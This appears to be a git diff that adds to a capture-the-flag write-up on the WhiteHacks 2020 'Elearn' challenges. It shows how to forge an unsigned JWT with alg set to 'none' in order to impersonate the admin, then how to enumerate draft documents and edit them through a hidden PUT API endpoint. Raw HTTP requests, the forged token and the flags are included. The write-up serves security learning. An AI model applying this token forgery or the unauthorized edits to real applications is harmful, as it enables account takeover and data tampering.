@@ -80,6 +80,9 @@ Access-Control-Allow-Origin: *
 Flag: WH2020{0Ld_5ch00l_Sql1}
 
 # Elearn (2/4) - JWT
+### Description
+Another feature of a modern single page application is the lack of session cookies, which WhiteHacks Academy claims it'll prevent session hijacking and session impersonation attacks. Instead, JSON Web Token (JWT) is powering its authentication mechanism. A powerful feature of JWT is its strong digital signatures that prevents any unauthorised tampering of its data. With this, an account will be all but possible, or is it?
+### Solution
 JWT is being used alot more in applications lately. Lately, there was a guy who received $100,000 bounty from Apple for a JWT vulnerability (damn!) - https://bhavukjain.com/blog/2020/05/30/zeroday-signin-with-apple/
 
 This challenge involved setting the JWT headers to "alg" : "None", this meant that the signature portion of the JWT will be redundant as there is no signature for the server to check with. If the server does not verify the JWT algorithm, we can spoof the JWT token and escalate our privileges to any user!
@@ -134,6 +137,105 @@ Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsI
 Connection: close
 Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
 ``````
+Response:
+``````
+HTTP/1.1 200 OK
+Server: nginx/1.19.1
+Date: Sun, 02 Aug 2020 16:02:00 GMT
+Content-Type: application/json
+Content-Length: 43
+Connection: close
+Access-Control-Allow-Origin: *
+{"id":3,"name":"Admin","username":"admin"}
+``````
 
+We can then load the page with the new JWT via BurpSuite an obtain the flag.
+Flag: WH2020{wh0_s@y5_5ing13_p@g3_@PP_i5nt_w3@k_t0_01d_vu1n5}
 
+# Elearn (3/4) - UNDISCLOSED
+### Description
+Let's talk about the course breakdown of WhiteHacks Elearn. Each course is regarded as a module, which consists of one or more lessons. Each lesson usually has accompanying documents and slides. The thing is, in order for there to be documents for download, there needs to be an interface to upload and edit them. Also, once the document is finalised, it is put out of draft mode and becomes published. When that happens, the document cannot be edited any further besides deleting it. The site administrator insists that he/she has hidden the file editing functionality, and cannot reinstate that under any circumstances. However, your professor has a serious typo he needs to fix, and asks for your help in discovering the way to update a document on the platform.
+### Solution
+Whenever you load the page of the app, you will encounter alot of API endpoints being loaded (if you use Burp). An example of a particular endpoint
+``````
+GET /api/modules/IS200/lessons/Lesson%2001/documents/Document%2001 HTTP/1.1
+Host: chals.whitehacks.ctf.sg:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://chals.whitehacks.ctf.sg:5000/home
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
+Connection: close
+Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
+``````
+What this does is that it queries for the contents of the document. If you actually checked the response of that:
+``````
+HTTP/1.1 200 OK
+Server: nginx/1.19.1
+Date: Sun, 02 Aug 2020 16:07:07 GMT
+Content-Type: application/json=
+Content-Length: 511
+Connection: close
+Access-Control-Allow-Origin: *
+{"content": "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum", "name": "Document 01", "is_draft": false, "id": 1}
+``````
+According to our request this is not a draft endpoint. The challenge mentioned that we have to modify a draft document. Using the JWT token for admin privileges, we can  can keep on querying the documents.
+``````
+GET /api/modules/WRIT001/lessons/Lesson%2001/documents HTTP/1.1
+Host: chals.whitehacks.ctf.sg:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://chals.whitehacks.ctf.sg:5000/home
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
+Connection: close
+Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
+``````
+Response:
+``````
+HTTP/1.1 200 OK
+Server: nginx/1.19.1
+Date: Sun, 02 Aug 2020 16:18:25 GMT
+Content-Type: application/json
+Content-Length: 108
+Connection: close
+Access-Control-Allow-Origin: *
+[{"content": "NOTFLAG{youre_almost_there_try_harder}", "name": "Document Flag", "is_draft": true, "id": 2}]
+``````
+According to our public document at /api/modules/IS200/lessons/Lesson%2001/documents/Document%2001, the API sturcture to access the contents of a document is /api/modules/IS200/lessons/Lesson%2001/documents/<document_name>.
 
+This means that we can access the document with /api/modules/IS200/lessons/Lesson%2001/documents/Document%20Flag. Remember we also want to modify this document. API functionality for REST API is usually modelled after CRUD
+``````
+C - CREATE via POST
+R - READ via GET
+U - UPDATE via PUT
+D - DELETE via DELETE
+``````
+So we can try doing PUT request to edit the draft.
+``````
+PUT /api/modules/WRIT001/lessons/Lesson%2001/documents/Document%20Flag HTTP/1.1
+Host: chals.whitehacks.ctf.sg:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://chals.whitehacks.ctf.sg:5000/home
+Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
+Connection: close
+Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
+``````
+Final Response:
+``````
+HTTP/1.1 200 OK
+Server: nginx/1.19.1
+Date: Sun, 02 Aug 2020 16:25:50 GMT
+Content-Type: application/json
+Content-Length: 52
+Connection: close
+Access-Control-Allow-Origin: *
+{"flag": "WH2020{@cc35S_15_gr@nt3d_t0_th3_ch0sEn}"}
+
+``````
+Flag: WH2020{@cc35S_15_gr@nt3d_t0_th3_ch0sEn}
